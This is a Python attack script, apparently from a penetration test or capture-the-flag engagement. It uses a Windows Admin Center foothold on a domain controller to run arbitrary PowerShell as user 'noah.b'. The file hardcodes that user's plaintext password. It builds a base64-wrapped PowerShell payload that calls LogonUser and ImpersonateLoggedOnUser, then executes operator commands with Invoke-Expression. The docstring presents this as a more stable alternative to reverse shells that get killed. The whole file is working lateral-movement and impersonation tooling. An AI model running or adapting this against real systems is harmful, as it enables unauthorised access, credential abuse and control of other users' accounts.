#!/usr/bin/env python3
"""Run PowerShell as noah.b (or other user) via anderson WAC + LogonUser.

Reverse shells on this box often get job-killed; impersonation under WAC is stable.

Usage:
  python3 noah_exec.py 'whoami; hostname'
  python3 noah_exec.py -f commands.ps1
  python3 noah_exec.py --user noah.b --password 'RiverDragon#Storm25' 'dir $env:USERPROFILE\\Desktop'
"""
from __future__ import annotations

import argparse
import base64
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from wac_ps import WAC  # noqa: E402


DEFAULT_USER = os.environ.get("NOAH_USER", "noah.b")
DEFAULT_PASS = os.environ.get("NOAH_PASS", "RiverDragon#Storm25")
DEFAULT_DOMAIN = os.environ.get("DOMAIN_NETBIOS", "danglingtree")


def wrap_impersonate(user_code: str, user: str, domain: str, password: str) -> str:
    b64 = base64.b64encode(user_code.encode("utf-8")).decode()
    # LOGON32_LOGON_INTERACTIVE = 2 works for noah on this DC under WAC
    return rf'''
$ErrorActionPreference='Continue'
$b64 = '{b64}'
$code = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class NXE {{
  [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
  public static extern bool LogonUser(string u,string d,string p,int t,int pr,out IntPtr tok);
  [DllImport("advapi32.dll", SetLastError=true)] public static extern bool ImpersonateLoggedOnUser(IntPtr t);
  [DllImport("advapi32.dll", SetLastError=true)] public static extern bool RevertToSelf();
  [DllImport("kernel32.dll", SetLastError=true)] public static extern bool CloseHandle(IntPtr h);
}}
"@
$tok = [IntPtr]::Zero
if (-not [NXE]::LogonUser('{user}','{domain}','{password}',2,0,[ref]$tok)) {{
  "LOGON_FAIL err=$([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
  return
}}
[void][NXE]::ImpersonateLoggedOnUser($tok)
try {{
  Set-Location C:\Windows\Temp -EA SilentlyContinue
  "=== as $([Security.Principal.WindowsIdentity]::GetCurrent().Name) ==="
  Invoke-Expression $code 2>&1 | Out-String
}} catch {{
  "ERR $($_.Exception.Message)"
}} finally {{
  [void][NXE]::RevertToSelf()
  [void][NXE]::CloseHandle($tok)
}}
'''


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd", nargs="?", default="whoami; hostname")
    ap.add_argument("-f", "--file", help="local .ps1 to run under target user")
    ap.add_argument("--user", default=DEFAULT_USER)
    ap.add_argument("--password", default=DEFAULT_PASS)
    ap.add_argument("--domain", default=DEFAULT_DOMAIN)
    ap.add_argument("--timeout", type=int, default=180)
    args = ap.parse_args()
    if args.file:
        user_code = open(args.file, encoding="utf-8", errors="replace").read()
    else:
        user_code = args.cmd

    script = wrap_impersonate(user_code, args.user, args.domain, args.password)
    w = WAC()
    print(w.run(script, timeout=args.timeout))
    return 0


if __name__ == "__main__":
    sys.exit(main())
